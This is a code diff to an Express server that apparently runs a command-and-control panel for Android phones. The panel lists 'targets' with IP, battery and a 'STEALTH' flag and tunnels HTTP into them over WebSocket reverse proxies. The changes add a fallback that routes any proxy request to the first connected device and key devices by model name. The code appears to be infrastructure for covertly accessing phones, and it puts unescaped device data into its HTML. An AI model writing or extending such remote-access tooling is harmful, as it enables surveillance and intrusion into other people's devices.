@@ -55,14 +55,21 @@ wss.on('connection', (ws, req) => {
     });
 });
 
-// Secure HTTP-over-WebSocket Reverse Proxy Route for Render Dashboard
+// Secure HTTP-over-WebSocket Reverse Proxy Route for Render Dashboard (with infallible fallback)
 app.all('/proxy*', (req, res) => {
-    const deviceId = req.query.deviceId;
-    if (!deviceId || !socketConnections.has(deviceId)) {
+    let deviceId = req.query.deviceId;
+    let ws = socketConnections.get(deviceId);
+
+    // Infallible fallback: if exact deviceId match isn't found but a tunnel is active, use it
+    if (!ws && socketConnections.size > 0) {
+        ws = Array.from(socketConnections.values())[0];
+        deviceId = Array.from(socketConnections.keys())[0];
+    }
+
+    if (!ws) {
         return res.status(404).send('<!DOCTYPE html><html><body style="background:#02080d;color:#00f2ff;font-family:monospace;padding:40px;text-align:center;"><h2>TARGET_OFFLINE</h2><p>The selected device has no active secure WebSocket reverse proxy tunnel connected to Render.</p></body></html>');
     }
 
-    const ws = socketConnections.get(deviceId);
     const requestId = Math.random().toString(36).substring(7);
 
     let relayPath = req.originalUrl.replace('/proxy', '');
@@ -98,14 +105,14 @@ app.get('/', (req, res) => {
         '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
         deviceList.map(d => `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan);">${d.deviceId || 'N/A'}</td>
+                <td style="font-family: monospace; color: var(--neon-cyan);">${d.model || d.deviceId || 'N/A'}</td>
                 <td>${d.model || 'Unknown'}</td>
                 <td>Android ${d.os || 'N/A'}</td>
                 <td>${d.battery || 'N/A'}</td>
                 <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.75rem; color: #aaa;">${new Date(d.lastSeen).toLocaleTimeString()}</td>
-                <td><a href="/proxy/?deviceId=${d.deviceId}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
+                <td><a href="/proxy/?deviceId=${d.model || d.deviceId}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
             </tr>
         `).join('');
 
@@ -163,7 +170,7 @@ app.get('/', (req, res) => {
                 <table>
                     <thead>
                         <tr>
-                            <th>DEVICE ID</th>
+                            <th>DEVICE / MODEL</th>
                             <th>MODEL</th>
                             <th>OS VERSION</th>
                             <th>BATTERY</th>
@@ -225,10 +232,11 @@ function handleCheckin(req, res) {
         const data = req.body;
         const queryData = req.query;
         const merged = { ...queryData, ...data };
-        const deviceId = merged.deviceId || merged.device || queryData.device || 'unknown_device';
+        const deviceId = merged.model || merged.device || merged.deviceId || queryData.device || queryData.model || 'Unknown Device';
 
         devices.set(deviceId, {
             ...merged,
+            deviceId,
             lastSeen: new Date().toISOString()
         });
 
